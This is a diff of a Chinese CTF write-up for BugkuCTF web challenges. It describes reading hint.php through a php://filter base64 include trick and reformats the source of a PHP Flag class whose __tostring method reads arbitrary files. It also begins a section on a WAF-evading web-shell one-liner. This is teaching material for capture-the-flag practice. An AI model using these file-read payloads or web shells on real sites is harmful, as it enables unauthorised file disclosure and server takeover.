@@ -530,32 +530,20 @@ if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){
 再用 php://filter/read=convert.base64-encode/resource= 利用 include 漏洞读取 hint.php 
 base64 解密后得到 hint.php 源码
 ```php
-<?php
-
-class Flag{//flag.php
-
-public $file;
-
-public  function __tostring(){
-
-if(isset($this->file)){
-
-echo file_get_contents($this->file);
-
-echo "<br>";
-
-return ("good");
-
-}
-
-}
-
-}
-
+<?php  
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+			echo "<br>";
+		return ("good");
+        }  
+    }  
+}  
 ?>
-
-
-
+```
+定义了一个 Flag 类,不知有何用,但看见 flag.php
 ## 过狗一句话
 ```php
 <?php 
@@ -580,7 +568,7 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE0NjYzNzk5MjAsNTkzODM1MDEsLTEzMj
+eyJoaXN0b3J5IjpbLTE5NjA2MDcxMzAsNTkzODM1MDEsLTEzMj
 k2MTgwNDQsLTk4MTEzNTk5MCwyNTY3NDI4NzYsLTQ5MzkyMTQx
 NywxODc5MDIwNzYzLDE4NjIyMjE2NTMsLTExNjI0OTU4ODQsMT
 Y2NDk2NzE0NiwtMTg1Mzc2Mzg0OCwtNzk5MTMyMjcyLC0xOTQ5
